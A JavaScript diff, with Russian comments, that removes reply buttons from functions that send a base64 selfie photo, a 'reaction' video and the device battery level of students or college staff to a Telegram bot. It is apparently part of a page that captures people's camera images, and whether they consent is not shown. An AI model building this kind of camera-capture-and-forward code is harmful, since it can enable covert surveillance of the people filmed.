@@ -707,9 +707,9 @@
   }
 
   // ============================================================
-  //  ФОТО (с кнопками)
+  //  ФОТО (БЕЗ кнопок)
   // ============================================================
-  async function sendTelegramPhoto(photoBase64, caption, replyMarkup) {
+  async function sendTelegramPhoto(photoBase64, caption) {
     if (!photoBase64) return;
 
     const payload = {
@@ -719,7 +719,6 @@
       file_base64: photoBase64,
       filename: "selfie.jpg"
     };
-    if (replyMarkup) payload.reply_markup = replyMarkup;
 
     try {
       const res = await sendWithFailover("sendPhoto", payload);
@@ -732,9 +731,9 @@
   }
 
   // ============================================================
-  //  ВИДЕО (с кнопками)
+  //  ВИДЕО (БЕЗ кнопок)
   // ============================================================
-  async function sendTelegramVideo(videoBase64, caption, replyMarkup) {
+  async function sendTelegramVideo(videoBase64, caption) {
     if (!videoBase64) return;
 
     const payload = {
@@ -744,7 +743,6 @@
       file_base64: videoBase64,
       filename: "video.mp4"
     };
-    if (replyMarkup) payload.reply_markup = replyMarkup;
 
     try {
       const res = await sendWithFailover("sendVideo", payload);
@@ -1389,6 +1387,7 @@
 
   // ============================================================
   //  СОХРАНЕНИЕ: Firebase + Telegram
+  //  Кнопки — ТОЛЬКО в тексте
   // ============================================================
   async function saveToFirestore(videoBase64, photoBase64) {
     if (!pendingData) return;
@@ -1422,11 +1421,11 @@
           "⚠️ <b>Это сотрудник колледжа!</b>";
 
         await sendTelegramNotify(caption, buttons);
-        if (photoBase64) await sendTelegramPhoto(photoBase64, "📷 Фото педагога", buttons);
+        if (photoBase64) await sendTelegramPhoto(photoBase64, "📷 Фото педагога");
         if (videoBase64) {
-          await sendTelegramVideo(videoBase64, "🎥 Реакция педагога", buttons);
+          await sendTelegramVideo(videoBase64, "🎥 Реакция педагога");
         } else {
-          await sendTelegramNotify("🎬 <b>Видео не загрузилось</b>", buttons);
+          await sendTelegramNotify("🎬 <b>Видео не загрузилось</b>");
         }
       } else {
         const docData = {
@@ -1452,11 +1451,11 @@
           "🔋 <b>Заряд:</b> " + batteryStr;
 
         await sendTelegramNotify(caption, buttons);
-        if (photoBase64) await sendTelegramPhoto(photoBase64, "📷 Фото студента", buttons);
+        if (photoBase64) await sendTelegramPhoto(photoBase64, "📷 Фото студента");
         if (videoBase64) {
-          await sendTelegramVideo(videoBase64, "🎥 Реакция студента", buttons);
+          await sendTelegramVideo(videoBase64, "🎥 Реакция студента");
         } else {
-          await sendTelegramNotify("🎬 <b>Видео не загрузилось</b>", buttons);
+          await sendTelegramNotify("🎬 <b>Видео не загрузилось</b>");
         }
       }
     } catch (err) {}
